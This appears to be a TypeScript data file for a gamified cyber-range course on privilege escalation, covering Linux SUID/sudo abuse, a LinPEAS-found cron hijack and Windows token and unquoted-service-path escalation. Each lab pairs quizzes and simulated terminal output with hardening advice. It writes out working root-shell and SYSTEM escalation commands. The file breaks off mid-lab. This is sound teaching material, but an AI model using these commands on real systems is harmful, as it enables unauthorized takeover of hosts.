import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Privilege Escalation ────────────────────────────────────────
// From a low-priv foothold to root / SYSTEM: Linux SUID + sudo abuse, Linux
// enumeration (LinPEAS — cron, PATH, capabilities, kernel), Windows escalation
// (services, tokens), and persistence. Simulated faithful tooling; every step
// pairs with the hardening that prevents it. Public sources (GTFOBins, HackTricks
// concepts, MITRE ATT&CK).

export const rangePrivescEpoch: EpochConfig = {
  id: "range-privesc",
  name: "Privilege Escalation",
  subtitle: "From foothold to root / SYSTEM on Linux and Windows",
  description:
    "A low-privilege shell is the door, not the prize. Learn to escalate: Linux SUID and sudo abuse, systematic enumeration with LinPEAS (cron, PATH, capabilities, kernel), Windows privilege escalation, and establishing persistence — each paired with the hardening that shuts it down.",
  emoji: "⬆️",
  color: "Rose",
  unlocked: true,
};

const lowshell = { ip: "10.10.10.40", hostname: "lab-target", os: "Linux (www-data/low-priv shell)" } as const;

export const rangePrivescStages: StageConfig[] = [
  // ─── Lab 1: Linux SUID + sudo ───────────────────────────────────────────────
  {
    epochId: "range-privesc",
    wonder: { name: "The Setuid Bit", location: "Offensive Security Lab", era: "Present Day", emoji: "🪜" },
    id: "pe-01",
    order: 1,
    title: "Linux PrivEsc: SUID & sudo",
    subtitle: "Abuse a trusted binary to become root",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-pe-suid", name: "Root Climber", emoji: "🪜" },
    challengeType: "ctf",
    info: {
      tagline: "When a program runs as root and lets you run commands, you don't need root's password — you just need the program.",
      year: 1979,
      overview: [
        "Privilege escalation on Linux usually exploits trust the system extends to specific programs. The SUID (Set User ID) bit makes a binary run with the privileges of its owner — typically root — regardless of who launches it. That's legitimate for tools like `passwd` (which needs to write to a root-owned file), but it becomes a vulnerability when a SUID-root binary can be coerced into running an arbitrary command or spawning a shell. The classic enumeration is `find / -perm -4000 2>/dev/null`, which lists every SUID binary; the classic exploitation is GTFOBins, a catalog of how dozens of common binaries (find, vim, nmap, less, cp, bash) can be abused to break out into a root shell when they carry the SUID bit.",
        "The other dominant vector is sudo misconfiguration. `sudo -l` lists what the current user is permitted to run as root, and an over-broad rule — allowing a user to run vim, less, awk, or a custom script as root with NOPASSWD — is an instant escalation, because those programs can each spawn a shell or read/write any file. Even narrow-looking rules fall to GTFOBins. The defenses are precise: minimize and audit SUID binaries (remove the bit where it isn't required), grant sudo by least privilege (never wildcards, never shell-capable interpreters), keep the kernel and packages patched, and monitor for the enumeration and shell-spawn patterns these attacks produce.",
      ],
      technical: {
        title: "SUID & sudo Abuse",
        body: [
          "Enumeration (the first moves on any shell):\n- find / -perm -4000 -type f 2>/dev/null — list SUID-root binaries.\n- sudo -l — what may I run as root (and with NOPASSWD)?\n- getcap -r / 2>/dev/null — file capabilities (cap_setuid is as good as SUID).\n- id; uname -a; cat /etc/crontab — context, kernel, scheduled jobs.",
          "Exploitation via GTFOBins (the abuse catalog):\n- SUID find: find . -exec /bin/sh -p \\; -quit → root shell (the -p keeps euid=0).\n- sudo vim: sudo vim -c ':!/bin/sh' → root shell from the editor.\n- sudo awk / less / man / nmap --interactive — each can spawn a shell.\n- SUID cp/tar/python — overwrite /etc/passwd or read root-only files.",
          "The hardening (least privilege everywhere):\n- Remove the SUID bit from binaries that don't need it; audit the SUID set regularly.\n- Grant sudo by least privilege — specific full paths, never shell-capable tools or wildcards.\n- Patch the kernel/packages; use noexec/nosuid mounts where possible.\n- Detect: alert on SUID enumeration, sudo to shell-spawning binaries, and new SUID files.",
        ],
        codeExample: {
          label: "SUID find → root; sudo vim → root",
          code: `low-priv$ id
uid=33(www-data) gid=33(www-data)

# Enumerate SUID binaries
low-priv$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find        # ← SUID root, abusable (GTFOBins)

# Abuse SUID find to spawn a root shell (-p preserves euid)
low-priv$ find . -exec /bin/sh -p \\; -quit
# whoami -> root

# Or via an over-broad sudo rule
low-priv$ sudo -l
  (root) NOPASSWD: /usr/bin/vim
low-priv$ sudo vim -c ':!/bin/sh'   # -> root shell

# THE FIX: remove unneeded SUID bits; least-privilege sudo (no shells/wildcards)`,
        },
      },
      incident: {
        title: "GTFOBins — Living Off the Land to Root",
        when: "2018 (GTFOBins project) → an everyday privesc reference",
        where: "Linux/Unix systems with over-permissive SUID binaries and sudo rules",
        impact: "Misconfigured trust on common binaries routinely converts a foothold into full root",
        body: [
          "GTFOBins systematized something attackers had always done: abusing legitimate, trusted binaries to escalate. Because the binaries are normal system tools, the technique is 'living off the land' — no malware, just a SUID `find` or a permissive `sudo vim`. It is one of the most common ways a web-shell foothold (running as www-data) becomes root, and it persists because admins keep granting sudo too broadly or leaving SUID bits on tools that can spawn shells.",
          "The defense is configuration discipline: audit the SUID set and strip the bit where it isn't strictly required, write sudo rules to the narrowest possible command (never an interpreter or wildcard), and patch. On detection, sudo invocations of shell-capable binaries and SUID enumeration are high-signal events worth alerting on. Least privilege isn't a slogan here — it's the entire control.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Low-priv shell", sub: "www-data", type: "attacker" },
          { label: "SUID find / sudo vim", sub: "runs as root", type: "system" },
          { label: "Shell breakout", sub: "GTFOBins technique", type: "victim" },
          { label: "root", sub: "→ fix: least-priv SUID/sudo", type: "result" },
        ],
      },
      timeline: [
        { year: 1979, event: "SUID/setuid concept formalized in Unix" },
        { year: 2018, event: "GTFOBins catalogs binary-abuse escalation techniques", highlight: true },
        { year: 2021, event: "Sudo Baron Samedit (CVE-2021-3156) — heap overflow to root" },
      ],
      keyTakeaways: [
        "The SUID bit runs a binary as its owner (root); abusable SUID binaries = instant escalation",
        "Enumerate with find / -perm -4000 and sudo -l; exploit via GTFOBins",
        "Over-broad sudo (vim/less/awk/scripts as root) lets you spawn a root shell",
        "Living-off-the-land: no malware, just trusted binaries used against the system",
        "Fix: minimize/audit SUID, least-privilege sudo (no shells/wildcards), patch, and detect shell-spawns",
      ],
      references: [
        { title: "GTFOBins", url: "https://gtfobins.github.io/" },
        { title: "Linux Privilege Escalation (HackTricks)", url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation" },
      ],
    },
    quiz: {
      questions: [
        { id: "pe-01-q1", type: "SUID", challenge: "What it does.", text: "What does the SUID bit do?", options: ["Runs a binary with the privileges of its owner (often root), regardless of caller", "Encrypts the binary", "Disables the binary", "Hides the file"], correctIndex: 0, explanation: "SUID elevates the running process to the file owner's privileges." },
        { id: "pe-01-q2", type: "Enumeration", challenge: "Find SUID.", text: "Which command lists SUID-root binaries?", options: ["find / -perm -4000 -type f 2>/dev/null", "ls -la /", "ps aux", "cat /etc/passwd"], correctIndex: 0, explanation: "-perm -4000 matches the SUID bit." },
        { id: "pe-01-q3", type: "GTFOBins", challenge: "Abuse catalog.", text: "What is GTFOBins?", options: ["A catalog of how trusted binaries can be abused to escalate or break out", "A password cracker", "A firewall", "A kernel"], correctIndex: 0, explanation: "GTFOBins documents binary-abuse techniques." },
        { id: "pe-01-q4", type: "sudo", challenge: "What can I run.", text: "What does sudo -l reveal?", options: ["Which commands the user may run as root (and NOPASSWD rules)", "The root password", "Open ports", "The kernel version"], correctIndex: 0, explanation: "sudo -l lists permitted privileged commands." },
        { id: "pe-01-q5", type: "Exploit", challenge: "sudo vim.", text: "Why is 'sudo vim' a privilege escalation?", options: ["vim can spawn a shell (:!/bin/sh), giving a root shell", "vim encrypts files", "vim is a kernel", "It can't"], correctIndex: 0, explanation: "Editors/interpreters allowed via sudo can shell out as root." },
        { id: "pe-01-q6", type: "Concept", challenge: "LOTL.", text: "What is 'living off the land' here?", options: ["Abusing legitimate system binaries (no malware) to escalate", "Installing a rootkit", "Brute-forcing SSH", "DDoS"], correctIndex: 0, explanation: "It uses trusted tools, leaving little malware footprint." },
        { id: "pe-01-q7", type: "Capabilities", challenge: "SUID-like.", text: "Why are Linux capabilities (e.g. cap_setuid) relevant to privesc?", options: ["They can grant SUID-like power without the SUID bit", "They encrypt files", "They disable sudo", "They are unrelated"], correctIndex: 0, explanation: "getcap reveals capabilities that enable escalation." },
        { id: "pe-01-q8", type: "Defense", challenge: "Hardening.", text: "What's the core defense against SUID/sudo abuse?", options: ["Minimize/audit SUID, least-privilege sudo (no shells/wildcards), patch", "Open more ports", "Disable logging", "Use one shared sudo rule"], correctIndex: 0, explanation: "Least privilege on SUID and sudo is the entire control." },
      ],
    },
    ctf: {
      attackerMachine: lowshell,
      targetMachine: { ip: "10.10.10.40", hostname: "lab-target", os: "Linux", openPorts: "(local shell)", vulnerability: "abusable SUID binary + over-broad sudo rule" },
      scenario: "You have a low-privilege shell as www-data on 10.10.10.40. Enumerate SUID binaries and your sudo rights, then abuse one to escalate to root.",
      hint: "List SUID binaries and sudo -l, then use a GTFOBins technique to spawn a root shell.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Enumerate SUID binaries + sudo rights. Run: enum-suid",
        "Abuse a trusted binary to get root. Run: suid-root",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{SU1D_", label: "PrivEsc Briefing" },
        { trigger: "enum-suid", value: "SUD0_", label: "SUID + sudo Enumerated" },
        { trigger: "suid-root", value: "R00T_3SC4L4T3D}", label: "Escalated to root" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — PRIVESC LAB 1: SUID & SUDO (you are www-data)",
          "Goal: enumerate SUID + sudo, escalate to root via GTFOBins.",
          "Sequence: enum-suid -> suid-root -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "enum-suid": (_args: string[]) => ({
          lines: [
            "www-data$ find / -perm -4000 -type f 2>/dev/null",
            "  /usr/bin/passwd   /usr/bin/sudo",
            "  /usr/bin/find     <-- SUID root + abusable (GTFOBins)",
            "www-data$ sudo -l",
            "  (root) NOPASSWD: /usr/bin/vim   <-- over-broad",
            "",
            ">> LEARN: SUID find and sudo vim both run as root and can spawn a shell",
            "   Two clean escalation paths. Fragment collected.",
          ],
        }),
        "suid-root": (_args: string[]) => ({
          lines: [
            "www-data$ find . -exec /bin/sh -p \\; -quit",
            "# id",
            "uid=33(www-data) euid=0(root) gid=33   <-- ROOT shell (-p kept euid=0)",
            "# cat /root/flag.txt   ->  (flag retrieved)",
            "",
            ">> LEARN: a SUID-root binary that runs commands = root, no password needed",
            ">> BLUE TEAM: strip unneeded SUID bits; least-privilege sudo (no vim/wildcards).",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 2: Linux enumeration — LinPEAS ─────────────────────────────────────
  {
    epochId: "range-privesc",
    wonder: { name: "The Enumeration Engine", location: "Offensive Security Lab", era: "Present Day", emoji: "🔎" },
    id: "pe-02",
    order: 2,
    title: "Linux Enumeration: LinPEAS",
    subtitle: "Automate the hunt for the misconfiguration",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-pe-linpeas", name: "Enumeration Hunter", emoji: "🔎" },
    challengeType: "ctf",
    info: {
      tagline: "Most privilege escalation is finding the one misconfiguration — and tools like LinPEAS check hundreds of them in seconds.",
      year: 2019,
      overview: [
        "Privilege escalation is overwhelmingly an enumeration problem: the path to root is almost always a misconfiguration already present on the box, and the skill is finding it. Doing this by hand is slow, so enumeration scripts like LinPEAS (and LinEnum, linux-smart-enumeration) automate it — they run hundreds of checks and highlight the promising findings in red/yellow: writable files owned by root, cron jobs running as root, weak file permissions, the kernel version (for kernel exploits), stored credentials in config files and history, abusable capabilities, and writable PATH directories. A clean LinPEAS run turns hours of manual checking into a prioritized to-do list.",
        "The high-value findings cluster into a few categories. A writable cron job that root executes periodically is a reliable escalation — drop a payload, wait for the schedule. A writable directory early in root's PATH lets you hijack a command root runs. An outdated kernel maps to a public local-privilege-escalation exploit (DirtyCOW, DirtyPipe, PwnKit). Credentials left in `.bash_history`, config files, or environment variables hand over a higher-privileged account directly. The defenses are the inverse of the findings: correct file and directory permissions (nothing root-executed is world-writable), patched kernels and packages, no secrets in files or history, and host monitoring that flags the enumeration sweep and the privilege transition itself.",
      ],
      technical: {
        title: "Systematic Linux Enumeration",
        body: [
          "What LinPEAS checks (the privesc checklist, automated):\n- Writable files/dirs owned by root, and writable cron-executed scripts.\n- Kernel + distro version → map to local-priv-esc CVEs (DirtyCOW/DirtyPipe/PwnKit).\n- Stored credentials: config files, .bash_history, env vars, mounted shares.\n- SUID/SGID binaries, sudo rights, and file capabilities (getcap).\n- Writable PATH entries, NFS no_root_squash, weak service configs.",
          "Turning a finding into root:\n- Writable root cron: echo a reverse shell / chmod +s into the script, wait for the run.\n- PATH hijack: put a malicious binary named like a command root invokes, early in PATH.\n- Kernel exploit: compile + run the matching local-priv-esc PoC.\n- Found creds: su / sudo / ssh to the higher-priv account.",
          "The hardening (remove the findings):\n- Correct permissions: nothing root runs is world-writable; no writable PATH dirs.\n- Patch the kernel + packages (closes the LPE exploit class).\n- No secrets in files, history, or env; rotate anything exposed.\n- Detect: alert on enumeration script behavior and on cron/PATH/permission abuse.",
        ],
        codeExample: {
          label: "LinPEAS finds a writable root cron",
          code: `www-data$ ./linpeas.sh
[+] Cron jobs
  * * * * * root /opt/scripts/backup.sh
  -rwxrwxrwx root /opt/scripts/backup.sh   # ← WORLD-WRITABLE, runs as root!

# Hijack the cron-executed script → root
www-data$ echo 'cp /bin/bash /tmp/r; chmod +s /tmp/r' >> /opt/scripts/backup.sh
# ... wait for the next minute ...
www-data$ /tmp/r -p
r-4.4# id  ->  euid=0(root)

# THE FIX: root-run scripts must NOT be world-writable; patch; remove secrets`,
        },
      },
      incident: {
        title: "DirtyPipe, PwnKit — Kernel/Package LPE at Scale",
        when: "2021 (PwnKit/Polkit) · 2022 (DirtyPipe)",
        where: "Virtually all modern Linux distributions",
        impact: "A local user → root on nearly every Linux box until patched; trivially weaponized",
        body: [
          "Enumeration matters because the findings are devastating when present. PwnKit (CVE-2021-4034) in polkit's pkexec gave any local user instant root on essentially every Linux distribution; DirtyPipe (CVE-2022-0847) overwrote read-only files in the kernel for the same result. A LinPEAS run that surfaces an unpatched, vulnerable kernel or a vulnerable pkexec is a one-command escalation.",
          "The defensive program is straightforward but requires discipline: patch promptly (these LPEs are public and trivially weaponized), fix permissions so nothing root-executed is writable, purge secrets from files and history, and monitor for both the enumeration sweep and the privilege transition. The attacker automates the search for your one mistake — your job is to not leave one, and to see it when they look.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Low-priv shell", sub: "./linpeas.sh", type: "attacker" },
          { label: "Hundreds of checks", sub: "cron/PATH/kernel/creds", type: "system" },
          { label: "World-writable root cron", sub: "the misconfiguration", type: "victim" },
          { label: "root", sub: "→ fix: permissions + patch", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "PEASS-ng (LinPEAS/WinPEAS) standardizes privesc enumeration", highlight: true },
        { year: 2021, event: "PwnKit (CVE-2021-4034) — pkexec local root everywhere" },
        { year: 2022, event: "DirtyPipe (CVE-2022-0847) — kernel file overwrite to root" },
      ],
      keyTakeaways: [
        "Privesc is mostly enumeration: the path to root is usually a misconfiguration already on the box",
        "LinPEAS automates hundreds of checks and highlights the promising findings",
        "High-value: writable root cron, writable PATH, vulnerable kernel (LPE), stored credentials",
        "PwnKit and DirtyPipe show how a single unpatched component yields instant root",
        "Fix: correct permissions (nothing root-run is writable), patch, purge secrets, detect the sweep",
      ],
      references: [
        { title: "PEASS-ng (LinPEAS/WinPEAS)", url: "https://github.com/peass-ng/PEASS-ng" },
        { title: "Linux PrivEsc checklist (HackTricks)", url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation" },
      ],
    },
    quiz: {
      questions: [
        { id: "pe-02-q1", type: "Concept", challenge: "The real task.", text: "Privilege escalation is mostly which kind of problem?", options: ["An enumeration problem — finding an existing misconfiguration", "A brute-force problem", "A cryptography problem", "A DoS problem"], correctIndex: 0, explanation: "The path to root is usually already present; you must find it." },
        { id: "pe-02-q2", type: "Tool", challenge: "What it does.", text: "What does LinPEAS do?", options: ["Automates hundreds of privesc checks and highlights promising findings", "Cracks hashes", "Scans external ports", "Encrypts files"], correctIndex: 0, explanation: "LinPEAS is an enumeration script for local escalation paths." },
        { id: "pe-02-q3", type: "Cron", challenge: "Writable cron.", text: "Why is a world-writable root cron script an escalation?", options: ["You can edit it to run your code as root on the schedule", "Cron is encrypted", "It can't be edited", "Only root sees it"], correctIndex: 0, explanation: "A root-executed writable script runs whatever you put in it." },
        { id: "pe-02-q4", type: "PATH", challenge: "Hijack.", text: "How does a writable PATH directory enable privesc?", options: ["Plant a malicious binary named like a command root runs, early in PATH", "It encrypts PATH", "It disables sudo", "It can't"], correctIndex: 0, explanation: "PATH order lets your binary shadow a real command root invokes." },
        { id: "pe-02-q5", type: "Kernel", challenge: "Old kernel.", text: "Why does LinPEAS report the kernel version?", options: ["To map it to a known local-privilege-escalation exploit (e.g. DirtyPipe)", "For aesthetics", "To crack passwords", "To scan ports"], correctIndex: 0, explanation: "An outdated kernel often has a public LPE exploit." },
        { id: "pe-02-q6", type: "Creds", challenge: "Found secrets.", text: "Where do stored credentials commonly leak on a host?", options: ["Config files, .bash_history, env vars, mounted shares", "Only in /root", "Nowhere", "Only in RAM"], correctIndex: 0, explanation: "Secrets in files/history hand over higher-priv accounts." },
        { id: "pe-02-q7", type: "Real World", challenge: "Instant root.", text: "What did PwnKit (CVE-2021-4034) provide?", options: ["Local user → root on nearly every Linux distro (pkexec/polkit)", "Remote DoS", "A web XSS", "WiFi cracking"], correctIndex: 0, explanation: "PwnKit gave instant local root almost everywhere until patched." },
        { id: "pe-02-q8", type: "Defense", challenge: "Remove findings.", text: "What's the defensive program against these escalations?", options: ["Correct permissions, patch kernel/packages, purge secrets, detect the sweep", "Open more services", "Disable logging", "Share root widely"], correctIndex: 0, explanation: "Remove the misconfigurations the enumeration looks for." },
      ],
    },
    ctf: {
      attackerMachine: lowshell,
      targetMachine: { ip: "10.10.10.40", hostname: "lab-target", os: "Linux", openPorts: "(local shell)", vulnerability: "world-writable root cron script" },
      scenario: "You're www-data on 10.10.10.40 with no obvious SUID win. Run LinPEAS to enumerate, find the misconfiguration it highlights, and exploit it to become root.",
      hint: "Run the enumeration script, spot the highlighted writable root cron, and hijack it.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Auto-enumerate escalation paths. Run: linpeas",
        "Exploit the highlighted misconfiguration. Run: cron-hijack",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{L1NP34S_", label: "Enumeration Briefing" },
        { trigger: "linpeas", value: "CR0N_", label: "Misconfiguration Found" },
        { trigger: "cron-hijack", value: "M1SC0NF1G}", label: "Root via Cron Hijack" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — PRIVESC LAB 2: ENUMERATION (LinPEAS)",
          "You are www-data. No easy SUID win. Find the misconfig.",
          "Sequence: linpeas -> cron-hijack -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "linpeas": (_args: string[]) => ({
          lines: [
            "www-data$ ./linpeas.sh   (running 300+ checks ...)",
            "[+] Kernel: 5.4.0 (patched — no easy LPE)",
            "[+] Cron jobs:",
            "  * * * * * root /opt/scripts/backup.sh",
            "  -rwxrwxrwx 1 root root /opt/scripts/backup.sh   <-- RED: world-writable, runs as ROOT",
            "[+] No creds in history; PATH not writable.",
            "",
            ">> LEARN: LinPEAS highlighted the one win — a root cron you can edit",
            "   Hundreds of checks → a single prioritized finding. Fragment collected.",
          ],
        }),
        "cron-hijack": (_args: string[]) => ({
          lines: [
            "www-data$ echo 'cp /bin/bash /tmp/r; chmod +s /tmp/r' >> /opt/scripts/backup.sh",
            "  ... waiting for the * * * * * schedule ...",
            "www-data$ /tmp/r -p",
            "r# id  ->  euid=0(root)",
            "r# cat /root/flag.txt   ->  (flag retrieved)",
            "",
            ">> LEARN: a root-run writable script executes YOUR code as root",
            ">> BLUE TEAM: root-owned cron scripts must be 0755 root:root (not writable); patch.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 3: Windows privilege escalation ────────────────────────────────────
  {
    epochId: "range-privesc",
    wonder: { name: "The Service Path", location: "Offensive Security Lab", era: "Present Day", emoji: "🪟" },
    id: "pe-03",
    order: 3,
    title: "Windows PrivEsc: Services & Tokens",
    subtitle: "From a user shell to NT AUTHORITY\\SYSTEM",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-pe-windows", name: "SYSTEM Climber", emoji: "🪟" },
    challengeType: "ctf",
    info: {
      tagline: "Windows hands SYSTEM to whoever controls a privileged service or holds the right token — both are common misconfigurations.",
      year: 2010,
      overview: [
        "Windows privilege escalation targets the gap between a normal user and NT AUTHORITY\\SYSTEM, and like Linux it's mostly enumeration of misconfigurations — WinPEAS and PowerUp automate the hunt. The classic service-based vectors are unquoted service paths (a service path with spaces and no quotes lets you drop a malicious binary that Windows runs as SYSTEM), weak service permissions (you can reconfigure the service binary), and unattended/stored credentials in files, the registry, or the SYSVOL share. Each turns control of a SYSTEM-level service into SYSTEM-level code execution.",
        "The other major family is token impersonation. Service accounts often hold the SeImpersonatePrivilege, and the 'Potato' family of exploits (JuicyPotato, PrintSpoofer, RoguePotato) abuse it to impersonate a SYSTEM token and escalate — a near-universal win from a service-account web shell. AlwaysInstallElevated (a policy that runs MSI installers as SYSTEM) and missing patches for known LPEs round out the toolkit. The defenses are configuration and patch hygiene: quote service paths and lock service permissions, never store credentials in files/registry/scripts, remove SeImpersonate from accounts that don't need it, disable AlwaysInstallElevated, and patch — plus monitoring for service changes, suspicious child processes of services, and token manipulation.",
      ],
      technical: {
        title: "Windows Escalation Vectors",
        body: [
          "Service-based escalation:\n- Unquoted service path: C:\\Program Files\\My App\\svc.exe → drop C:\\Program.exe; Windows runs it as SYSTEM.\n- Weak service perms (accesschk): reconfigure the service binary path to your payload (sc config).\n- DLL hijacking / writable service binary directory.",
          "Token & policy escalation:\n- SeImpersonatePrivilege + a Potato exploit (PrintSpoofer/JuicyPotato/RoguePotato) → impersonate SYSTEM (common on service accounts).\n- AlwaysInstallElevated = 1 → install a malicious MSI as SYSTEM.\n- Stored creds: registry (Winlogon, VNC), unattend.xml, Group Policy Preferences (SYSVOL cpassword).\n- Missing-patch LPEs (e.g. PrintNightmare, known CVEs).",
          "The hardening:\n- Quote all service paths; lock service permissions (no user-writable service binaries).\n- Remove SeImpersonatePrivilege from accounts that don't require it; patch.\n- Never store credentials in files/registry/GPP; use managed service accounts.\n- Disable AlwaysInstallElevated; monitor service changes + token manipulation + odd service children.",
        ],
        codeExample: {
          label: "WinPEAS → unquoted path / token to SYSTEM",
          code: `C:\\> whoami /priv
SeImpersonatePrivilege   Enabled   # ← Potato-exploitable

# Token impersonation (service account) → SYSTEM
C:\\> PrintSpoofer.exe -i -c cmd
C:\\Windows\\System32> whoami
nt authority\\system                # SYSTEM!

# OR — unquoted service path
C:\\> wmic service get name,pathname | findstr /i "Program Files"
  MyService   C:\\Program Files\\My App\\svc.exe   (unquoted)
#   drop C:\\Program.exe (your payload) -> runs as SYSTEM on service start

# THE FIX: quote service paths, lock perms, remove SeImpersonate, patch`,
        },
      },
      incident: {
        title: "PrintNightmare & the Potato Family — Service/Token to SYSTEM",
        when: "2016 (Potato family) · 2021 (PrintNightmare)",
        where: "Windows servers and workstations with privileged services and impersonation rights",
        impact: "Routine user-to-SYSTEM escalation; a workhorse step in real intrusions and ransomware",
        body: [
          "Windows escalation is a near-constant feature of real intrusions: a foothold on a service account with SeImpersonatePrivilege falls to a Potato exploit almost universally, and PrintNightmare (2021) turned the print spooler into a remote-and-local SYSTEM escalation that organizations scrambled to mitigate. Unquoted service paths and stored Group Policy Preferences passwords (the SYSVOL cpassword issue) have handed out SYSTEM for over a decade.",
          "The fixes are configuration and patch discipline mapped to each vector: quote service paths and lock service ACLs, strip SeImpersonate where it isn't needed, never store credentials in files/registry/GPP, disable AlwaysInstallElevated, and patch known LPEs promptly. Detection focuses on service reconfiguration, token manipulation, and services spawning shells — the observable tells of these escalations.",
        ],
      },
      diagram: {
        nodes: [
          { label: "User / service acct", sub: "SeImpersonate / weak svc", type: "attacker" },
          { label: "Potato / unquoted path", sub: "abuse the misconfig", type: "system" },
          { label: "SYSTEM code execution", sub: "service runs your binary", type: "victim" },
          { label: "NT AUTHORITY\\SYSTEM", sub: "→ fix: quote/lock/patch", type: "result" },
        ],
      },
      timeline: [
        { year: 2010, event: "Unquoted service path + GPP cpassword escalations documented" },
        { year: 2016, event: "Potato family (token impersonation) matures", highlight: true },
        { year: 2021, event: "PrintNightmare — spooler to SYSTEM, mass mitigation" },
      ],
      keyTakeaways: [
        "Windows privesc bridges user → SYSTEM, mostly via service or token misconfigurations",
        "Unquoted service paths and weak service permissions let you run code as SYSTEM",
        "SeImpersonatePrivilege + a Potato exploit (PrintSpoofer) is a near-universal service-account win",
        "Stored creds (registry, unattend.xml, GPP/SYSVOL) and missing LPE patches escalate directly",
        "Fix: quote/lock services, remove SeImpersonate, no stored creds, disable AlwaysInstallElevated, patch",
      ],
      references: [
        { title: "WinPEAS / PowerUp (PEASS-ng)", url: "https://github.com/peass-ng/PEASS-ng" },
        { title: "Windows PrivEsc (HackTricks)", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" },
      ],
    },
    quiz: {
      questions: [
        { id: "pe-03-q1", type: "Target", challenge: "The goal.", text: "What account does Windows privesc aim for?", options: ["NT AUTHORITY\\SYSTEM", "Guest", "A standard user", "Administrator only"], correctIndex: 0, explanation: "SYSTEM is the highest local privilege on Windows." },
        { id: "pe-03-q2", type: "Service", challenge: "Unquoted path.", text: "Why is an unquoted service path with spaces exploitable?", options: ["Windows may execute an attacker binary placed at an earlier path segment, as SYSTEM", "It encrypts the service", "It disables the service", "It can't be exploited"], correctIndex: 0, explanation: "Spaces + no quotes let C:\\Program.exe run before the intended binary." },
        { id: "pe-03-q3", type: "Token", challenge: "Impersonation.", text: "What does SeImpersonatePrivilege enable for an attacker?", options: ["Impersonating a SYSTEM token via a Potato exploit", "Encrypting the disk", "Resetting passwords", "Nothing"], correctIndex: 0, explanation: "Potato exploits abuse SeImpersonate to become SYSTEM." },
        { id: "pe-03-q4", type: "Tool", challenge: "Potato.", text: "What does PrintSpoofer/JuicyPotato accomplish?", options: ["Escalate a service account with SeImpersonate to SYSTEM", "Scan ports", "Crack WiFi", "Phish users"], correctIndex: 0, explanation: "They are token-impersonation escalations to SYSTEM." },
        { id: "pe-03-q5", type: "Creds", challenge: "Stored secrets.", text: "Where are Windows credentials commonly found by attackers?", options: ["Registry, unattend.xml, and Group Policy Preferences (SYSVOL cpassword)", "Only in RAM", "Nowhere", "Only on the DC keyboard"], correctIndex: 0, explanation: "These locations have leaked SYSTEM/admin creds for years." },
        { id: "pe-03-q6", type: "Policy", challenge: "MSI as SYSTEM.", text: "What does AlwaysInstallElevated=1 allow?", options: ["Installing a malicious MSI that runs as SYSTEM", "Faster updates", "Disabling Defender", "Nothing"], correctIndex: 0, explanation: "It runs any MSI installer with SYSTEM privileges." },
        { id: "pe-03-q7", type: "Real World", challenge: "Spooler.", text: "What was PrintNightmare (2021)?", options: ["A print-spooler vulnerability enabling escalation to SYSTEM (and RCE)", "A ransomware family", "A phishing kit", "A WiFi attack"], correctIndex: 0, explanation: "PrintNightmare abused the spooler for SYSTEM-level execution." },
        { id: "pe-03-q8", type: "Defense", challenge: "Hardening.", text: "What's the defensive program for Windows privesc?", options: ["Quote/lock services, remove SeImpersonate, no stored creds, disable AlwaysInstallElevated, patch", "Share local admin", "Disable logging", "Open RDP to all"], correctIndex: 0, explanation: "Configuration + patch hygiene removes the vectors." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.10.41", hostname: "win-target", os: "Windows (service-account shell)" },
      targetMachine: { ip: "10.10.10.41", hostname: "win-target", os: "Windows Server 2019", openPorts: "(local shell)", vulnerability: "SeImpersonatePrivilege + unquoted service path" },
      scenario: "You have a shell as a service account on the Windows host 10.10.10.41. Enumerate your privileges and the services, then escalate to NT AUTHORITY\\SYSTEM.",
      hint: "Check whoami /priv for SeImpersonate, then use a token-impersonation (Potato) escalation to SYSTEM.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Enumerate privileges + services. Run: winpeas",
        "Impersonate a SYSTEM token. Run: token-system",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{W1N_", label: "Windows PrivEsc Briefing" },
        { trigger: "winpeas", value: "T0K3N_", label: "SeImpersonate Found" },
        { trigger: "token-system", value: "SYST3M_PWN3D}", label: "Escalated to SYSTEM" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — PRIVESC LAB 3: WINDOWS (service-account shell @ 10.10.10.41)",
          "Goal: enumerate privileges/services, escalate to SYSTEM.",
          "Sequence: winpeas -> token-system -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "winpeas": (_args: string[]) => ({
          lines: [
            "C:\\> winpeas.exe quiet",
            "[+] Token privileges:",
            "  SeImpersonatePrivilege   Enabled   <-- Potato-exploitable",
            "[+] Services:",
            "  MyService  C:\\Program Files\\My App\\svc.exe  (UNQUOTED path)",
            "[+] AlwaysInstallElevated: not set",
            "",
            ">> LEARN: two SYSTEM paths — SeImpersonate (token) and the unquoted service path",
            "   Service accounts almost always hold SeImpersonate. Fragment collected.",
          ],
        }),
        "token-system": (_args: string[]) => ({
          lines: [
            "C:\\> PrintSpoofer.exe -i -c cmd",
            "[+] Found privilege: SeImpersonatePrivilege",
